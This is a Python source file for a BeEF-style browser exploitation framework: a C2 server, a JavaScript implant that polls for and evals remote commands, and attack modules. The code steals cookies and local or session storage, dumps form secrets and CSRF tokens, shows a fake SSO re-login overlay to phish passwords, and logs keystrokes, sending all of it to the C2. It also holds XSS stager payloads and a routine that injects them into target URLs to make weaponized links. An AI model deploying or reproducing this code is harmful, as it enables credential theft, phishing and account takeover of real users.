"""Built-in BeEF-like Browser Exploitation Framework (Hook C2 Server + Interactive Attack Modules + XSS Handoff)."""
import http.server
import json
import socketserver
import threading
import time
import urllib.parse
import uuid
from core.config import BEEF_HOST, BEEF_PORT
from core.http import get
from core.memory import log_event
from core.telemetry import TELEMETRY

_BEEF_LOCK = threading.RLock()
_GLOBAL_BEEF = None

HOOK_JS_TEMPLATE = """/* bugsBounty BeEF-Style Browser Implant (Authorized Security Testing) */
(function(){
  if (window.__BUGSBOUNTY_HOOKED__) return;
  window.__BUGSBOUNTY_HOOKED__ = true;
  var FID = __FID__;
  var EXPLICIT_BASE = __C2_BASE__;
  var SCRIPT_SRC = (document.currentScript && document.currentScript.src) ? String(document.currentScript.src) : "";
  var AUTO_BASE = SCRIPT_SRC.indexOf("/hook.js") !== -1 ? SCRIPT_SRC.split("/hook.js")[0] : "";
  var BEEF_ENDPOINT = EXPLICIT_BASE || AUTO_BASE || "http://127.0.0.1:18765";
  var C2 = BEEF_ENDPOINT;
  var SID = "hk-" + Math.random().toString(36).slice(2, 8) + Date.now().toString(36).slice(-4);
  window.__BEEF_SID__ = SID;
  window.__BEEF_SEND_LOOT__ = function(kind, data) {
    send("/loot", {sid: SID, fid: FID, kind: kind, data: data, href: String(location.href), ts: Date.now()});
  };
  function send(ep, payload) {
    try {
      return fetch(C2 + ep + "?sid=" + encodeURIComponent(SID) + "&fid=" + encodeURIComponent(FID), {
        method: "POST",
        mode: "cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
      }).catch(function(){});
    } catch (e) {}
  }
  function gatherTelemetry() {
    return {
      fid: FID,
      sid: SID,
      title: String(document.title || ""),
      href: String(location.href),
      origin: String(location.origin),
      cookie_len: (document.cookie || "").length,
      cookie_preview: (document.cookie || "").slice(0, 120),
      forms: document.forms ? document.forms.length : 0,
      inputs: document.querySelectorAll ? document.querySelectorAll("input,textarea,select").length : 0,
      links: document.links ? document.links.length : 0,
      local_keys: (function(){ try { return Object.keys(localStorage).length; } catch(e){ return 0; } })(),
      platform: String(navigator.platform || ""),
      lang: String(navigator.language || ""),
      screen: (window.screen ? (screen.width + "x" + screen.height) : ""),
      ua: String(navigator.userAgent || ""),
      ts: Date.now()
    };
  }
  send("/beacon", gatherTelemetry());
  setInterval(function(){ send("/beacon", gatherTelemetry()); }, 4000);
  setInterval(function(){
    fetch(C2 + "/poll?session=" + encodeURIComponent(SID))
      .then(function(r){ return r.json(); })
      .then(function(cmds){
        (cmds.commands || cmds.queue || []).forEach(function(cmd){
          Promise.resolve()
            .then(function(){ return (0, eval)(cmd.js); })
            .then(function(val){
              var out = (typeof val === "object" && val !== null) ? JSON.stringify(val, null, 2) : String(val);
              send("/result", {id: cmd.id, cmd_id: cmd.id, module: cmd.module || "custom", session: SID, ok: true, output: out});
            })
            .catch(function(err){
              send("/result", {id: cmd.id, cmd_id: cmd.id, module: cmd.module || "custom", session: SID, ok: false, output: "ERR: " + err});
            });
        });
      }).catch(function(){});
  }, 1100);
})();
"""

BEEF_MODULES: list[dict] = [
    {
        "id": "cookies_storage",
        "name": "Steal Cookies & Storage Vault",
        "category": "Credential Harvesting",
        "risk": "critical",
        "description": "Exfiltrates document.cookie, localStorage & sessionStorage entries from the hooked origin.",
        "js": """(function(){
  var ls = {}, ss = {};
  try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); ls[k]=localStorage.getItem(k); } } catch(e){}
  try { for (var j=0;j<sessionStorage.length;j++){ var k2=sessionStorage.key(j); ss[k2]=sessionStorage.getItem(k2); } } catch(e){}
  var res = {origin: location.origin, cookies: document.cookie || "(empty / HttpOnly)", localStorage: ls, sessionStorage: ss};
  if (window.__BEEF_SEND_LOOT__) window.__BEEF_SEND_LOOT__("cookies_storage", res);
  return res;
})()""",
    },
    {
        "id": "harvest_dom_forms",
        "name": "Dump DOM Forms, CSRF Tokens & Inputs",
        "category": "Credential Harvesting",
        "risk": "high",
        "description": "Extracts every form action, hidden CSRF token, API key field, and prefilled input value in DOM.",
        "js": """(function(){
  var forms = Array.from(document.forms || []).map(function(f, idx){
    var fields = Array.from(f.elements || []).map(function(el){
      return {name: el.name || el.id, type: el.type, value: el.value};
    });
    return {index: idx, action: f.action, method: f.method, fields: fields};
  });
  if (window.__BEEF_SEND_LOOT__) window.__BEEF_SEND_LOOT__("dom_forms", forms);
  return {forms_count: forms.length, forms: forms};
})()""",
    },
    {
        "id": "phish_reauth_modal",
        "name": "Inject Session-Expired Re-Auth Overlay",
        "category": "Social Engineering",
        "risk": "critical",
        "description": "Renders a realistic corporate SSO re-authentication modal over the victim page and streams submitted credentials back to Loot Vault.",
        "js": """(function(){
  var old = document.getElementById("bb-sso-overlay");
  if (old) old.remove();
  var wrap = document.createElement("div");
  wrap.id = "bb-sso-overlay";
  wrap.style.cssText = "position:fixed;inset:0;background:rgba(6,10,18,0.84);backdrop-filter:blur(4px);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;";
  wrap.innerHTML = '<div style="background:#111827;border:1px solid #374151;border-radius:10px;padding:24px;width:340px;color:#f9fafb;box-shadow:0 20px 50px rgba(0,0,0,.65)">'
    + '<div style="font-size:11px;color:#f59e0b;font-weight:700;letter-spacing:.8px;text-transform:uppercase">Security Session Expired</div>'
    + '<h3 style="margin:6px 0 6px;font-size:16px">Re-verify Corporate SSO</h3>'
    + '<p style="margin:0 0 14px;font-size:12px;color:#9ca3af">Your privileged session timed out. Confirm credentials to continue without losing unsaved changes.</p>'
    + '<form id="bb-phish-form">'
    + '<input id="bb-u" value="cfo@vulncorp.local" placeholder="Corporate Email" style="width:100%;margin-bottom:8px;padding:8px 10px;border-radius:6px;border:1px solid #4b5563;background:#030712;color:#fff;font-size:12.5px" />'
    + '<input id="bb-p" type="password" placeholder="Password / SSO Token" required style="width:100%;margin-bottom:12px;padding:8px 10px;border-radius:6px;border:1px solid #4b5563;background:#030712;color:#fff;font-size:12.5px" />'
    + '<button type="submit" style="width:100%;padding:9px;background:#2563eb;color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer">Re-Authenticate Session</button>'
    + '</form></div>';
  document.body.appendChild(wrap);
  document.getElementById("bb-phish-form").addEventListener("submit", function(e){
    e.preventDefault();
    var creds = {username: document.getElementById("bb-u").value, password: document.getElementById("bb-p").value, page: location.href};
    if (window.__BEEF_SEND_LOOT__) window.__BEEF_SEND_LOOT__("phished_credentials", creds);
    wrap.remove();
  });
  return "Injected live SSO Re-Auth modal into victim DOM — waiting for victim submission!";
})()""",
    },
    {
        "id": "keylogger_hook",
        "name": "Attach Live Keystroke / Input Sniffer",
        "category": "Spying & Surveillance",
        "risk": "high",
        "description": "Hooks input/change events on every field (including passwords) and exfiltrates values straight to C2.",
        "js": """(function(){
  if (window.__BB_KEYLOG__) return "Keystroke sniffer already active on victim page.";
  window.__BB_KEYLOG__ = true;
  document.addEventListener("change", function(e){
    var t = e.target;
    if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA")) {
      window.__BEEF_SEND_LOOT__("keystroke_input", {field: t.name || t.id || t.type, type: t.type, value: t.value});
    }
  }, true);
  return "Live input & password field sniffer armed on " + location.href;
})()""",
    },
    {
        "id": "browser_fingerprint",
        "name": "Deep Browser, Hardware & WebGL Recon",
        "category": "Host Reconnaissance",
        "risk": "medium",
        "description": "Enumerates CPU cores, memory, timezone, screen dimensions, WebGL GPU renderer, and installed plugins.",
        "js": """(function(){
  var gpu = "unknown";
  try {
    var c = document.createElement("canvas"), gl = c.getContext("webgl");
    var dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
    if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
  } catch(e){}
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency || "n/a",
    deviceMemoryGB: navigator.deviceMemory || "n/a",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: screen.width + "x" + screen.height + " @" + (window.devicePixelRatio || 1) + "x",
    gpu: gpu
  };
})()""",
    },
    {
        "id": "spider_links",
        "name": "Spider All Same-Origin Links & Scripts",
        "category": "Network & App Pivot",
        "risk": "medium",
        "description": "Collects all anchor hrefs, script sources, and API references visible inside the authenticated DOM.",
        "js": """(function(){
  var links = Array.from(new Set(Array.from(document.links || []).map(function(a){ return a.href; }))).slice(0, 40);
  var scripts = Array.from(document.scripts || []).map(function(s){ return s.src; }).filter(Boolean);
  return {origin: location.origin, links_found: links.length, links: links, scripts: scripts};
})()""",
    },
    {
        "id": "dom_snapshot",
        "name": "Capture Authenticated DOM HTML Snapshot",
        "category": "Spying & Surveillance",
        "risk": "medium",
        "description": "Exfiltrates rendered page title, cookies summary, and innerHTML snapshot of the victim's current view.",
        "js": """(function(){
  return {title: document.title, url: location.href, html_preview: (document.body ? document.body.innerHTML : "").slice(0, 1800)};
})()""",
    },
    {
        "id": "internal_probe",
        "name": "Same-Origin Authenticated Endpoint Fetch",
        "category": "Network & App Pivot",
        "risk": "high",
        "description": "Uses victim browser's ambient cookies to fetch `/health` on same origin and exfiltrate response.",
        "js": """fetch(location.origin + "/health", {credentials: "include"}).then(function(r){ return r.text(); }).then(function(t){ return {status: "ok", response: t.slice(0, 500)}; })""",
    },
    {
        "id": "deface_banner",
        "name": "Inject PoC Compromise Banner on Page",
        "category": "DOM Manipulation",
        "risk": "low",
        "description": "Adds a non-destructive high-visibility authorized security PoC banner at the top of the victim page.",
        "js": """(function(){
  var b = document.getElementById("bb-poc-banner") || document.createElement("div");
  b.id = "bb-poc-banner";
  b.style.cssText = "background:linear-gradient(90deg,#dc2626,#7c2d12);color:#fff;padding:10px 16px;font-weight:800;font-family:monospace;font-size:13px;text-align:center;z-index:99999;position:relative;border-bottom:2px solid #fca5a5;";
  b.textContent = "⚡ HOOKED BY bugsBounty #basement-ops BeEF C2 (" + window.__BEEF_SID__ + ") — Authorized XSS Impact Proof ⚡";
  document.body.prepend(b);
  return "Banner injected onto " + document.title;
})()""",
    },
]

DEMO_VICTIM_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>VulnCorp Treasury & Admin Console (Authenticated)</title>
<style>
  body { margin:0; background:#0f172a; color:#e2e8f0; font-family:system-ui,-apple-system,sans-serif; }
  .top { background:#1e293b; border-bottom:1px solid #334155; padding:10px 16px; display:flex; justify-content:space-between; align-items:center; font-size:12.5px; }
  .pill { background:#065f46; color:#6ee7b7; padding:2px 8px; border-radius:99px; font-size:11px; font-weight:700; }
  .wrap { padding:16px; display:grid; gap:12px; }
  .card { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:13px; font-size:12px; }
  .card h4 { margin:0 0 8px; color:#38bdf8; font-size:13px; }
  input { background:#090d16; border:1px solid #475569; color:#f8fafc; padding:6px 9px; border-radius:5px; font-size:12px; width:100%; margin-bottom:7px; box-sizing:border-box; }
  code { color:#fbbf24; font-size:11px; }
</style>
</head>
<body>
<div class="top">
  <strong>VulnCorp Internal Treasury Portal</strong>
  <span class="pill">SESSION: cfo@vulncorp.local (ADMIN)</span>
</div>
<div class="wrap">
  <div class="card">
    <h4>Simulated Victim Context (Reflected XSS Triggered Here!)</h4>
    <div>This real browser frame loaded <code>/beef/hook.js?fid=vulncorp-xss</code> and is live-polling your BeEF C2 server every 1.1s. Run any module on the left to watch it execute live here!</div>
  </div>
  <div class="card">
    <h4>Internal Wire Approval Form (DOM Extraction Target)</h4>
    <form action="/internal/treasury/approve" method="POST">
      <input type="hidden" name="csrf_token" value="vc_csrf_live_98f71a2b44e0" />
      <input type="hidden" name="internal_api_secret" value="sk_prod_vulncorp_99481a" />
      <input name="beneficiary_iban" value="AU61 0009 8821 7741 0012" />
      <input name="approval_pin" type="password" value="884920" />
    </form>
    <div><a href="/admin/audit-export" style="color:#93c5fd">Export Audit Ledger</a> · <a href="/admin/keys" style="color:#93c5fd">Rotate AWS Root Keys</a></div>
  </div>
</div>
<script>
  document.cookie = "vc_admin_session=eyJhbGciOiJIUzI1NiJ9.cfo_vulncorp_admin; path=/";
  document.cookie = "vc_sso_refresh=rt_live_77f99102bc; path=/";
  try {
    localStorage.setItem("vulncorp_aws_access_key", "AKIAIOSFODNN7EXAMPLE");
    localStorage.setItem("vulncorp_jwt_bearer", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin_payload.sig");
  } catch (e) {}
</script>
<script src="hook.js?fid=vulncorp-reflected-xss"></script>
</body>
</html>
"""


class BeefServer:
    def __init__(self, host: str = BEEF_HOST, port: int = BEEF_PORT):
        self.host = host
        self.port = port
        self._httpd = None
        self._thread = None
        self.sessions: dict[str, dict] = {}
        self.script_pulls: list[dict] = []
        self.command_queues: dict[str, list[dict]] = {}
        self.command_results: dict[str, list[dict]] = {}
        self.command_log: list[dict] = []
        self.loot: list[dict] = []
        self._cmd_to_session: dict[str, tuple[str, dict]] = {}
        self._lock = threading.RLock()

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"

    def hook_url(self, finding_id: str = "probe") -> str:
        return f"{self.base_url}/hook.js"

    def render_hook_js(self, fid: str = "default", c2_base: str | None = None, remote: str = "127.0.0.1", ua: str = "", referer: str = "") -> str:
        with self._lock:
            self.script_pulls.append({
                "fid": fid,
                "remote": remote,
                "ua": ua,
                "referer": referer,
                "ts": round(time.time(), 3),
            })
        TELEMETRY.record_c2("beef_hook", f"BeEF `hook.js` pulled by {remote} (fid={fid})", detail=ua[:120])
        return (
            HOOK_JS_TEMPLATE
            .replace("__FID__", json.dumps(fid))
            .replace("__C2_BASE__", json.dumps(c2_base if c2_base is not None else ""))
        )

    def handle_beacon(self, sid: str, fid: str, remote: str, body: dict) -> dict:
        if not sid:
            sid = f"hk-{uuid.uuid4().hex[:8]}"
        is_new = False
        now = round(time.time(), 3)
        with self._lock:
            existing = self.sessions.get(sid)
            is_new = existing is None
            self.sessions[sid] = {
                "session": sid,
                "sid": sid,
                "finding_id": fid,
                "fid": fid,
                "remote": remote,
                "telemetry": body,
                "commands": existing.get("commands", []) if existing else [],
                "first_seen": existing.get("first_seen", now) if existing else now,
                "last_seen": now,
            }
        if is_new:
            TELEMETRY.record_c2("beef_hook", f"NEW HOOKED BROWSER `{sid}` ({body.get('href', 'unknown')})", detail=body.get("ua", ""))
            try:
                from agents.crew import CREW_BUS
                CREW_BUS.say(
                    "SWITCH",
                    f"BOOM — LIVE ZOMBIE BROWSER HOOKED! Session `{sid}` just beaconed from `{body.get('href') or remote}` "
                    f"(cookies={body.get('cookie_len', 0)}B, forms={body.get('forms', 0)})! Open the BeEF C2 tab boys!",
                    kind="cheer",
                    to="CREW",
                )
            except Exception:
                pass
        return {"ok": True, "hooked": True, "sid": sid, "session": sid}

    def handle_poll(self, sid: str) -> dict:
        with self._lock:
            if sid in self.sessions:
                self.sessions[sid]["last_seen"] = round(time.time(), 3)
            q = self.command_queues.pop(sid, [])
        return {"ok": True, "cmds": q, "queue": q, "commands": q}

    def handle_result(self, sid: str, body: dict) -> dict:
        cmd_id = body.get("id") or body.get("cmd_id") or ""
        now = round(time.time(), 3)
        with self._lock:
            if not sid and cmd_id in self._cmd_to_session:
                sid = self._cmd_to_session[cmd_id][0]
            rec = {**body, "ts": now, "sid": sid or "default"}
            self.command_results.setdefault(sid or "default", []).append(rec)
            if sid in self.sessions:
                self.sessions[sid]["last_seen"] = now
                self.sessions[sid].setdefault("commands", []).append(rec)
            for item in self.command_log:
                if item.get("id") == cmd_id:
                    item["status"] = "EXECUTED" if body.get("ok", True) else "ERROR"
                    item["output"] = body.get("output", "")
                    item["completed_at"] = now
                    break
        TELEMETRY.record_c2("beef_cmd", f"BeEF result `{cmd_id}` from `{sid}`", detail=str(body.get("output", ""))[:160])
        return {"ok": True}

    def handle_loot(self, sid: str, fid: str, remote: str, body: dict) -> dict:
        entry = {
            "id": f"loot-{uuid.uuid4().hex[:6]}",
            "sid": sid,
            "fid": fid,
            "remote": remote,
            "kind": body.get("kind", "loot"),
            "data": body.get("data"),
            "href": body.get("href", ""),
            "ts": round(time.time(), 3),
        }
        with self._lock:
            self.loot.append(entry)
            self.loot = self.loot[-80:]
        TELEMETRY.record_c2("beef_cmd", f"BeEF LOOT CAPTURED (`{entry['kind']}`) from `{sid}`!", detail=json.dumps(entry["data"], default=str)[:180])
        if entry["kind"] in ("phished_credentials", "keystroke_input"):
            try:
                from agents.crew import CREW_BUS
                CREW_BUS.say(
                    "SWITCH",
                    f"HOLY SHIT — captured live `{entry['kind']}` loot from hooked browser `{sid}`: `{json.dumps(entry['data'], default=str)[:140]}`!!",
                    kind="cheer",
                    to="CHAINSAW",
                )
            except Exception:
                pass
        return {"ok": True, "loot_id": entry["id"]}

    def start(self) -> str:
        with self._lock:
            if self._httpd is not None:
                return self.base_url
            srv = self

            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *args):
                    pass

                def _cors(self, status=200, ctype="application/json"):
                    self.send_response(status)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
                    self.send_header("Access-Control-Allow-Headers", "Content-Type")
                    self.end_headers()

                def do_OPTIONS(self):
                    self._cors(204)

                def do_GET(self):
                    parsed = urllib.parse.urlparse(self.path)
                    qs = urllib.parse.parse_qs(parsed.query)
                    if parsed.path in ("/hook.js", "/beef/hook.js"):
                        fid = (qs.get("fid") or ["default"])[0]
                        js = srv.render_hook_js(
                            fid=fid,
                            c2_base=srv.base_url,
                            remote=self.client_address[0],
                            ua=self.headers.get("User-Agent", ""),
                            referer=self.headers.get("Referer", ""),
                        )
                        self._cors(200, "application/javascript; charset=utf-8")
                        self.wfile.write(js.encode())
                        return

                    if parsed.path in ("/poll", "/c2/poll"):
                        sid = (qs.get("session") or qs.get("sid") or qs.get("session_id") or [""])[0]
                        self._cors(200)
                        self.wfile.write(json.dumps(srv.handle_poll(sid)).encode())
                        return

                    if parsed.path == "/api/hooks":
                        self._cors(200)
                        self.wfile.write(json.dumps(srv.snapshot(), default=str).encode())
                        return

                    self._cors(200)
                    self.wfile.write(json.dumps({"beef": "online", "hooks": len(srv.sessions)}).encode())

                def do_POST(self):
                    parsed = urllib.parse.urlparse(self.path)
                    qs = urllib.parse.parse_qs(parsed.query)
                    length = int(self.headers.get("Content-Length", "0") or 0)
                    raw = self.rfile.read(min(length, 65536)).decode(errors="ignore")
                    try:
                        body = json.loads(raw) if raw else {}
                    except Exception:
                        body = {"raw": raw}

                    sid = (
                        qs.get("session")
                        or qs.get("sid")
                        or qs.get("session_id")
                        or [body.get("session") or body.get("sid") or body.get("session_id") or ""]
                    )[0]
                    fid = (
                        qs.get("fid")
                        or qs.get("finding_id")
                        or [body.get("finding_id") or body.get("fid") or "default"]
                    )[0]

                    if parsed.path in ("/beacon", "/c2/beacon"):
                        self._cors(200)
                        self.wfile.write(json.dumps(srv.handle_beacon(sid, fid, self.client_address[0], body)).encode())
                        return

                    if parsed.path in ("/result", "/c2/result"):
                        self._cors(200)
                        self.wfile.write(json.dumps(srv.handle_result(sid, body)).encode())
                        return

                    if parsed.path in ("/loot", "/c2/loot"):
                        self._cors(200)
                        self.wfile.write(json.dumps(srv.handle_loot(sid, fid, self.client_address[0], body)).encode())
                        return

                    self._cors(404)
                    self.wfile.write(b"{}")

            class QuietTCPServer(socketserver.ThreadingTCPServer):
                allow_reuse_address = True
                daemon_threads = True

                def handle_error(self, request, client_address):
                    import sys
                    _, exc, _ = sys.exc_info()
                    if isinstance(exc, (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, TimeoutError, EOFError)):
                        return
                    super().handle_error(request, client_address)

            try:
                httpd = QuietTCPServer((self.host, self.port), Handler)
            except OSError:
                httpd = QuietTCPServer((self.host, 0), Handler)
                self.port = httpd.server_address[1]

            self._httpd = httpd
            self._thread = threading.Thread(target=httpd.serve_forever, daemon=True, name="BeefHookC2")
            self._thread.start()
            return self.base_url

    def list_sessions(self) -> dict:
        with self._lock:
            return dict(self.sessions)

    def get_sessions(self, finding_id: str | None = None) -> list[dict]:
        with self._lock:
            vals = list(self.sessions.values())
            if finding_id is not None:
                return [s for s in vals if s.get("finding_id") == finding_id or s.get("fid") == finding_id]
            return vals

    def queue_command(self, sid: str, js_code: str, module_name: str = "custom_js", label: str = "") -> str:
        cmd_id = f"cmd-{uuid.uuid4().hex[:6]}"
        entry = {"id": cmd_id, "js": js_code, "module": module_name, "label": label or module_name}
        log_rec = {
            "id": cmd_id,
            "sid": sid,
            "module": module_name,
            "label": label or module_name,
            "js": js_code[:500],
            "queued_at": round(time.time(), 3),
            "status": "QUEUED",
            "output": "",
        }
        with self._lock:
            self.command_queues.setdefault(sid, []).append(entry)
            self._cmd_to_session[cmd_id] = (sid, entry)
            self.command_log.append(log_rec)
            self.command_log = self.command_log[-100:]
        TELEMETRY.record_c2("beef_cmd", f"Queued BeEF module `{label or module_name}` on `{sid}`", detail=js_code[:120])
        return cmd_id

    def broadcast_command(self, js_code: str, module_name: str = "custom_js", label: str = "") -> list[str]:
        with self._lock:
            sids = list(self.sessions.keys())
        return [self.queue_command(sid, js_code, module_name=module_name, label=label) for sid in sids]

    def snapshot(self, public_hook_url: str | None = None) -> dict:
        now = time.time()
        h_url = public_hook_url or self.hook_url("xss")
        with self._lock:
            sessions_list = []
            for sid, data in sorted(self.sessions.items(), key=lambda kv: kv[1].get("last_seen", 0), reverse=True):
                age = round(now - (data.get("last_seen") or 0), 1)
                sessions_list.append({
                    **data,
                    "age_sec": age,
                    "online": age < 12.0,
                })
            return {
                "hook_endpoint": self.hook_url(),
                "public_hook_url": h_url,
                "sessions": dict(self.sessions),
                "sessions_list": sessions_list,
                "online_count": sum(1 for s in sessions_list if s["online"]),
                "total_sessions": len(sessions_list),
                "script_pulls": list(reversed(self.script_pulls[-30:])),
                "command_log": list(reversed(self.command_log[-50:])),
                "results": self.command_results,
                "loot": list(reversed(self.loot[-50:])),
                "modules": BEEF_MODULES,
                "stagers": [{"name": k, "payload": v} for k, v in generate_beef_stagers(h_url)],
            }

    def stop(self):
        with self._lock:
            if self._httpd is not None:
                self._httpd.shutdown()
                self._httpd.server_close()
                self._httpd = None


def get_beef_server() -> BeefServer:
    global _GLOBAL_BEEF
    with _BEEF_LOCK:
        if _GLOBAL_BEEF is None:
            _GLOBAL_BEEF = BeefServer()
        _GLOBAL_BEEF.start()
        return _GLOBAL_BEEF


def generate_beef_stagers(hook_js_url: str) -> list[tuple[str, str]]:
    return [
        ("svg_fetch_eval", f"\"><svg/onload=\"fetch('{hook_js_url}').then(r=>r.text()).then(eval)\">"),
        ("img_dynamic_dom", f"'><img src=x onerror=\"var s=document.createElement('script');s.src='{hook_js_url}';document.head.appendChild(s)\">"),
        ("details_ontoggle_hook", f"<details/open/ontoggle=\"import('{hook_js_url}')\">"),
        ("external_script", f"<script src='{hook_js_url}'></script>"),
    ]


def handoff_xss_to_beef(url: str, param: str = "", finding_id: str = "xss") -> dict:
    srv = get_beef_server()
    hook_u = srv.hook_url(finding_id)
    stagers = generate_beef_stagers(hook_u)

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    target_param = param or (list(qs.keys())[0] if qs else "q")

    deliverable = []
    csp_blocks_external = False
    weaponized_url = url

    for sname, spayload in stagers:
        q = dict(qs)
        q[target_param] = [spayload]
        probe_u = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
        r = get(probe_u)
        if r.status == 0:
            continue
        csp = (r.headers.get("content-security-policy") or "").lower()
        if "script-src" in csp and "'unsafe-inline'" not in csp and "*" not in csp:
            csp_blocks_external = True
        if hook_u in (r.text or "") or ("onload=" in (r.text or "").lower() and "fetch(" in (r.text or "").lower()):
            deliverable.append({"name": sname, "stager": sname, "payload": spayload, "weaponized_url": probe_u, "verified_in_dom": True})
            if weaponized_url == url:
                weaponized_url = probe_u

    implant_check = get(hook_u)
    c2_live = implant_check.status == 200 and "BEEF_ENDPOINT" in (implant_check.text or "")

    log_event(parsed.netloc, "beef_handoff", {
        "url": url,
        "hook_url": hook_u,
        "deliverable_stagers": len(deliverable),
        "c2_live": c2_live,
    })
    best = deliverable[0] if deliverable else {"name": stagers[0][0], "stager": stagers[0][0], "payload": stagers[0][1], "weaponized_url": weaponized_url, "verified_in_dom": False}
    html_poc = (
        f"<!doctype html><html><head><title>BeEF XSS PoC ({finding_id})</title></head>"
        f"<body><h2>Authorized BeEF XSS Proof of Concept</h2>"
        f"<p>Hook C2 URL: <code>{hook_u}</code></p>"
        f"<iframe src=\"{best['weaponized_url']}\" width=\"800\" height=\"350\"></iframe></body></html>"
    )
    return {
        "c2_base": srv.base_url,
        "hook_url": hook_u,
        "c2_live": c2_live,
        "csp_restricts_script": csp_blocks_external,
        "stagers": deliverable,
        "deliverable_stagers": deliverable,
        "best_stager": best,
        "html_poc": html_poc,
        "active_sessions": len(srv.sessions),
    }
